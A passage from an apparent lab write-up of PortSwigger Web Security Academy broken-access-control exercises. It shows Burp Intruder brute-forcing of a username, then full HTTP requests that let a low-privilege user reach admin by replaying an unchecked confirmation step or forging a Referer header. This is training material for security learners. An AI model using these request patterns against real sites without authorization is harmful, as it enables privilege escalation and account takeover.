Cookie: session=hlIloC8eCrpiJY9pJljBNl2JiCvKUQXf
Content-Length: 83
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

csrf=4Hy6d4HfxBh9tejmAdF5YcTXDcpA6iwz&username=§username§&password=0m6ice5es9msn6ir229v
```

Go to the Payloads tab Load the wordlist that contains the username after that go to the Resource Pool tab and Create a New resource pool that sends only 1 concurrent request.

> **Note**: If you don't specify the concurrent request to 1 this will break the session handling rule

Start the attack and in response, you should see the `carlos` user response length is less than another request length that shows the carlos user matches the password. Login to the `carlos` account to access its account and solves the lab.

---

## BAC in Multi-step process

Application may implement functions in series of steps for example take the analogy of a Credit card and ATM machine in which you first enter your card into the ATM and then give your pin code, after that, you enter your amount to withdraw your cash. Just like this web application may implement functions that need to be completed in order.

Sometimes applications may have rigorous access controls over some of these steps but ignore others. Going back to our credit card analogy attackers just withdraw cash without entering a pin code or credit card. This will cause the application to perform actions that are not valid and may cause some unexpected problems in the application.

### LAB #12:  Multi-step process with no access controls on one step

Lab URL: https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step

**Objective**

Familiarized yourself with the admin panel function to promote the user's role, After that promote the low-privilege user to the administrator using his account.

**Credentials**
```
administrator:admin
wiener:peter
```

**Solution**

We can login to the admin account using `administrator` credentials. After successful login, we can visit the `/admin` endpoint in which we have the privilege to either upgrade or downgrade the user to admin or normal user.

The upgrade request sends the POST request to the `/admin-roles` endpoint with the following request 

```
POST /admin-roles HTTP/2
Host: 0a5400ae030f3fc180d8eeea005a00de.web-security-academy.net
Cookie: session=6SJbvhBVHSsigOFwZrgHEEWbGsiD1Qpl
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=wiener&action=upgrade
```

After that, they asked for confirmation whether to proceed to upgrade or not. If yes then they send the following request.

```
POST /admin-roles HTTP/2
Host: 0a5400ae030f3fc180d8eeea005a00de.web-security-academy.net
Cookie: session=6SJbvhBVHSsigOFwZrgHEEWbGsiD1Qpl
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36

action=upgrade&confirmed=true&username=wiener
```

These two requests are made by the admin to upgrade any users, the same steps are for downgrade also.

Now login using `wiener` users using his credentials and try to send an upgrade request to the `/admin-roles` endpoint to upgrade him like the following.

```
POST /admin-roles HTTP/2
Host: 0a5400ae030f3fc180d8eeea005a00de.web-security-academy.net
Cookie: session=[wiener cookie]
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36

username=wiener&action=upgrade
```

They give us a straight error that we are `Unauthorized`, Now try the other request that has a `confirmed` value in it.

```
POST /admin-roles HTTP/2
Host: 0a5400ae030f3fc180d8eeea005a00de.web-security-academy.net
Cookie: session=[wiener cookie]
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36

action=upgrade&confirmed=true&username=wiener
```

Sending this request upgrade the `wiener` user to the `admin` role and now they have access to the `/admin` panel.

---
## Broken Referer-based access controls

Some websites based access controls on the `Referer` header submitted in the HTTP request. The `Referer` header is generally added to requests by browsers to indicate the page from which a request was initiated.

For example, suppose an application robustly enforces access control over the main administrative page at `/admin`, but for sub-pages such as `/admin/deleteUser` only inspects the `Referer` header. If the `Referer` header contains the main `/admin` URL, then the request is allowed.

In this situation, since the `Referer` header can be fully controlled by an attacker, they can forge direct requests to sensitive sub-pages, supplying the required `Referer` header, and so gain unauthorized access.

### LAB #13: Referer-based access controls

Lab URL: https://portswigger.net/web-security/access-control/lab-referer-based-access-control

**Objective**

Familiarize yourself with the admin panel and after that upgrade the low-privilege user to the admin role with his account.

**Credentials**
```
administrator:admin
wiener:peter
```

**Solution**

Login using the `administrator` account with his credentials and go to the `/admin` endpoint. There you see the functionality to either upgrade or downgrade users. The upgrade request will send the `GET` request to the `/admin-roles` endpoint with the parameters `username` and `action`. The whole request is like the following.

```
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: 0aa600ba04eee7178022cb07001700ed.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Connection: keep-alive
Referer: https://0aa600ba04eee7178022cb07001700ed.web-security-academy.net/admin
Cookie: session=X47wK3M4533ybGUC6lIobSiIZMLI49xT
```

Now login using the `wiener` user and send the `GET` request to this endpoint with that parameters. You see an error message unauthorized on the screen, looks like proper access controls are in place that checks the user's session to perform this action. Try again but this time using add the referrer header in your request like the above request has. You will see they accept it and the `wiener` user is now an `admin` user that has access to the `/admin` endpoint.

In the above request, we see the application not checking the user's session to perform this action instead of that they are checking the Referrer Header that point to the `/admin` endpoint. HTTP headers are attacker controlled and this thing is vulnerable to this kind of attack.

Similar kinds of attacks are also possible for **Location-based access controls** in which they enforce access controls using the geographical location of users. Attackers can attack this using web proxies, VPNs, and by manipulating client-side geolocation mechanisms.